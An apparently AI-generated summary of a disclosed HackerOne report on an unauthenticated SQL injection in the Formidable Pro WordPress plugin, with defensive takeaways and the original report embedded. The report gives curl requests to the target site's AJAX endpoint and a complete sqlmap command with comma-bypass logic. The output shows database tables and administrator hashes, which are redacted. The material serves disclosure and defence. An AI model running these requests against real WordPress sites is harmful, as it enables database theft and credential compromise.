# SQL Injection in Formidable Pro WordPress Plugin via Unauthenticated AJAX Preview Function

## Metadata
- **Source:** HackerOne
- **Report:** 273946 | https://hackerone.com/reports/273946
- **Submitted:** 2017-10-03
- **Reporter:** jouko
- **Program:** www.drivegrab.com
- **Bounty:** Not specified in writeup
- **Severity:** Critical
- **Vuln:** SQL Injection, Authentication Bypass, Information Disclosure
- **CVEs:** None
- **Category:** uncategorised

## Summary
The Formidable Pro WordPress plugin contains an SQL injection vulnerability in the [display-frm-data] shortcode's order_by parameter, which is accessible via an unauthenticated AJAX endpoint (frm_forms_preview). An attacker can inject malicious SQL into the ORDER BY clause to extract arbitrary database contents through boolean-based blind SQL injection techniques.

## Attack scenario
1. Attacker discovers the frm_forms_preview AJAX action is accessible without authentication by sending a basic curl request to wp-admin/admin-ajax.php
2. Attacker identifies that the after_html parameter accepts WordPress shortcodes and experiments with the [display-frm-data] shortcode
3. Attacker crafts a malicious order parameter containing SQL injection payload in the ORDER BY clause
4. Attacker uses boolean-based blind SQL injection to extract data by manipulating sort order based on TRUE/FALSE conditions
5. Attacker bypasses comma-filtering by using mathematical operations (addition/subtraction) to neutralize unwanted query fragments
6. Attacker retrieves sensitive database information such as user credentials or private form submissions using automated sqlmap attacks

## Root cause
The plugin fails to properly validate and sanitize the order and order_by parameters from the [display-frm-data] shortcode before directly incorporating them into SQL ORDER BY clauses. Additionally, the frm_forms_preview AJAX function lacks authentication checks despite being an admin-level feature.

## Attacker mindset
An attacker would recognize that AJAX endpoints are often overlooked in security testing and that WordPress plugins frequently have sanitization gaps. The attacker would methodically test shortcode parameters, discover the boolean-blind SQL injection technique works despite comma-filtering, and automate data extraction using sqlmap with custom tamper modules.

## Defensive takeaways
- Implement strict input validation on all shortcode parameters using whitelisting (e.g., only allow ASC/DESC for order parameter)
- Use parameterized queries or prepared statements with placeholders instead of string concatenation for SQL ORDER BY clauses
- Require authentication and capability checks (e.g., current_user_can('manage_forms')) for all AJAX endpoints, especially admin preview functions
- Apply principle of least privilege - restrict AJAX preview functionality to authenticated administrators only
- Implement rate limiting and anomaly detection on AJAX endpoints to detect automated SQL injection attacks
- Use WordPress security plugins and regularly update Formidable Pro to patch known vulnerabilities
- Conduct security code review of all shortcode parameter handling, particularly those that interact with database queries
- Implement Web Application Firewall (WAF) rules to detect and block SQL injection patterns in POST parameters

## Variant hunting
Search for other Formidable Pro shortcodes that accept parameters passed to SQL queries (search, filter, sort functionality). Examine other AJAX actions with 'preview' or 'view' in the name that may lack authentication. Test other WordPress plugins using similar patterns of accepting shortcode parameters from user input. Review any custom shortcodes that build SQL queries with user-controlled ORDER BY, GROUP BY, or WHERE clauses.

## MITRE ATT&CK
- T1190
- T1005
- T1078

## Notes
This vulnerability demonstrates a common pattern: admin features exposed to unauthenticated users combined with insufficient input validation. The attacker's use of sqlmap with custom tamper modules and --eval parameters shows sophistication in bypassing the comma-filtering defense mechanism. The writeup provides excellent technical detail on how mathematical operations can neutralize unwanted SQL fragments, which is valuable for both attackers and defenders.

## Full report
<details><summary>Expand</summary>

**Summary:**
The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.

**Description:**
The plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.

The preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.

## Browsers Verified In:
N/A

## Steps To Reproduce:
Verifying the AJAX preview function with the cURL tool:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
~~~~
This request shows a preset "contact us" form (if form id is not defined, you'll get the first form in the database).

The preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
~~~~
You see that "hello world" appears on the page after the "Contact us" form.

The HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.

The Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:

~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
~~~~

In the resulting HTML you see some form entries between "XXX" and "YYY".

The [display-frm-data] shortcode also accepts parameters "order_by" and "order" for sorting the entries. The "order_by" parameter can contain a field ID or list of them. The "order" parameter is supposed to contain "ASC" or "DESC" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.

Example:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
~~~~

Although this example gives no meaningful output, you should see in the server logs that the "zzz" went in an SQL query which produced an error message.

The shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.

The injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.

A further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.

I came up with the following sqlmap options to retrieve any data from the database:
~~~~
./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query "SELECT ██████████ FROM █████ WHERE id=2"
~~~~
This works with the latest sqlmap. The "commalesslimit" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.

Specifically, for each comma appearing in the order parameter, the plugin appends ",it.id" in the query. The repair code appends "-it.id+" after each comma to neutralize the effect. In other words, an injected "SELECT a,b" query would be translated to "SELECT a,it.id b" by the shortcode logic. The repair code changes it to "SELECT a, it.id-it.id+b" which evaluates to the original injected query.

Result of the above sqlmap command:
~~~~
[03:09:30] [INFO] testing █████
[03:09:30] [INFO] confirming ██████
[03:09:30] [INFO] the back-end DBMS is ███
web application technology: █████
back-end DBMS: ███████
[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'
[03:09:30] [INFO] retrieved: 1
[03:09:43] [INFO] retrieving the length of query output
[03:09:43] [INFO] ███
[03:10:46] [INFO] retrieved: █████             
SELECT ██████ FROM ████ WHERE id=2 [1]:
[*] ██████████
~~~~

## Supporting Material/References:

As a proof of concept I retrieved some data.

Tables in the database:
~~~~
[██████████]
+---------------------------------+
| █████████      |
| █████████          |
| █████████        |
| ███████     |
| ██████████ |
| ███████         |
| ██████████      |
| ████ |
| ██████████                |
| ███                   |
| ████████ |
| █████████                 |
| █████                  |
| ███             |
| █████████                  |
| ███████ |
| ███████         |
| ██████████       |
| ████             |
| █████                  |
| ██████████ |
| ███                      |
| █████                    |
| ██████████                   |
| ██████████                      |
| ████████ |
| █████████              |
| ████                   |
| ██████                      |
| ████████                   |
| ██████                      |
+---------------------------------+
~~~~

Administrator users and their password hashes:

~~~~
█████
█████
██████
████████
███
█████
████████
~~~~

Webroot path:
~~~~
███
~~~~


</details>

---
*Analysed by Claude on 2026-05-11*
